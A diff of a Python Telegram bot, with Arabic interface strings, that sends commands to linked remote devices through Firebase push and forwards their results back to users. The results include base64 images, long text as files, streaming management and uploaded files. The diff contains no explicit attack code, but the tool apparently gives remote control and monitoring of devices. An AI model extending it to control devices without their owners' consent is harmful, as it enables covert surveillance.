-            "command": actual_cmd,
-            "params": params,
-            "created_at": queued['created_at'],
-        })
+        try:
+            await push_command(device_id, {
+                "id": queued['id'],
+                "command": actual_cmd,
+                "params": params,
+                "created_at": queued['created_at'],
+            })
+        except Exception as e:
+            logger.warning(f"Firebase push failed for cmd {queued['id']}: {e}")
     
     # Track for result delivery
     msg = await send_message(chat_id,
@@ -894,34 +1329,79 @@ async def execute_device_command(chat_id: str, cmd_key: str, device_id: str, use
 # ─── Result Forwarding ────────────────────────────────────────
 
 async def forward_result(command_id: str, result_data: any):
-    """Forward a command result to the Telegram user who requested it."""
+    """Forward a command result to the Telegram user who requested it.
+
+    Called from api_command_result when a device submits a result. Detects
+    base64-encoded images (JPEG/PNG), long text, JSON, and short text, and
+    delivers the appropriate Telegram message type.
+    """
     msg_info = store.pending_messages.pop(command_id, None)
     if not msg_info:
         return
-    
+
     chat_id = msg_info['chat_id']
     device_id = msg_info['device_id']
     cmd_name = msg_info.get('cmd_name', 'Command')
-    
-    result_str = result_data if isinstance(result_data, str) else json.dumps(result_data, ensure_ascii=False, default=str)
-    
-    # Check if result is a base64 image
-    is_image = isinstance(result_str, str) and len(result_str) > 10000 and result_str.startswith('/9j/')
-    
+    status = msg_info.get('status', 'completed')
+
+    # Normalise result to string
+    if result_data is None:
+        result_str = ""
+    elif isinstance(result_data, str):
+        result_str = result_data
+    else:
+        try:
+            result_str = json.dumps(result_data, ensure_ascii=False, default=str)
+        except Exception:
+            result_str = str(result_data)
+
+    # Detect base64 image (JPEG: /9j/, PNG: iVBORw0KGgo)
+    is_jpeg = result_str.startswith('/9j/') and len(result_str) > 1000
+    is_png = result_str.startswith('iVBORw0KGgo') and len(result_str) > 1000
+    is_image = is_jpeg or is_png
+
+    status_icon = "✅" if status != 'failed' else "❌"
+
     if is_image:
         try:
             import base64
             img_bytes = base64.b64decode(result_str)
-            await send_photo(chat_id, img_bytes, caption=f"📸 {cmd_name}")
-        except Exception:
-            # If decode fails, send truncated text
-            await send_message(chat_id, f"✅ <b>{cmd_name}</b>\n\nنتيجة طويلة جداً لعرضها.")
+            await send_photo(chat_id, img_bytes, caption=f"{status_icon} {cmd_name}")
+        except Exception as e:
+            logger.warning(f"forward_result: image decode failed: {e}")
+            await send_message(chat_id,
+                f"{status_icon} <b>{cmd_name}</b>\n\nنتيجة طويلة جداً لعرضها ({len(result_str)} حرف).")
     elif len(result_str) > 4000:
-        await send_message(chat_id, f"✅ <b>{cmd_name}</b>\n\n{result_str[:4000]}...")
+        # Long text: try to send as document for full content
+        try:
+            await send_document(chat_id,
+                result_str.encode('utf-8'),
+                filename=f"{cmd_name}_{command_id[:8]}.txt",
+                caption=f"{status_icon} {cmd_name} — النتيجة الكاملة")
+        except Exception:
+            await send_message(chat_id,
+                f"{status_icon} <b>{cmd_name}</b>\n\n{result_str[:4000]}...")
     elif result_str:
-        await send_message(chat_id, f"✅ <b>{cmd_name}</b>\n\n<code>{result_str}</code>")
+        # Short text: send inline
+        await send_message(chat_id,
+            f"{status_icon} <b>{cmd_name}</b>\n\n<code>{result_str}</code>")
     else:
-        await send_message(chat_id, f"✅ <b>{cmd_name}</b>\n\nتم التنفيذ بنجاح.")
+        await send_message(chat_id,
+            f"{status_icon} <b>{cmd_name}</b>\n\nتم التنفيذ بنجاح.")
+
+    # Also update the original "جاري التنفيذ..." message if we have its id
+    orig_msg_id = msg_info.get('message_id')
+    if orig_msg_id:
+        try:
+            await api_call("editMessageText", {
+                "chat_id": chat_id,
+                "message_id": orig_msg_id,
+                "text": f"{status_icon} <b>{cmd_name}</b>\n\nتم استلام النتيجة ✅",
+                "parse_mode": "HTML",
+                "disable_web_page_preview": True,
+            })
+        except Exception:
+            pass  # Best-effort edit
 
 
 # ─── Polling Loop ─────────────────────────────────────────────
@@ -1004,12 +1484,21 @@ async def start_bot():
         "commands": [
             {"command": "start", "description": "القائمة الرئيسية / ربط الحساب"},
             {"command": "help", "description": "قائمة الأوامر"},
+            {"command": "menu", "description": "عرض القائمة"},
+            {"command": "overview", "description": "لوحة المعلومات (نظرة عامة)"},
             {"command": "devices", "description": "قائمة الأجهزة"},
+            {"command": "results", "description": "نتائج الأوامر الأخيرة"},
+            {"command": "streaming", "description": "إدارة البث المباشر"},
+            {"command": "files", "description": "الملفات المرفوعة"},
+            {"command": "events", "description": "آخر الأحداث"},
             {"command": "link", "description": "كود الربط الخاص بك (دائم)"},
+            {"command": "unlink", "description": "فك ربط جهاز"},
+            {"command": "users", "description": "المستخدمون (للمسؤول)"},
             {"command": "status", "description": "حالة الخادم"},
             {"command": "stats", "description": "الإحصائيات"},
             {"command": "logs", "description": "آخر السجلات"},
             {"command": "settings", "description": "الإعدادات"},
+            {"command": "search", "description": "البحث في الأجهزة"},
         ]
     })
     asyncio.create_task(poll_loop())
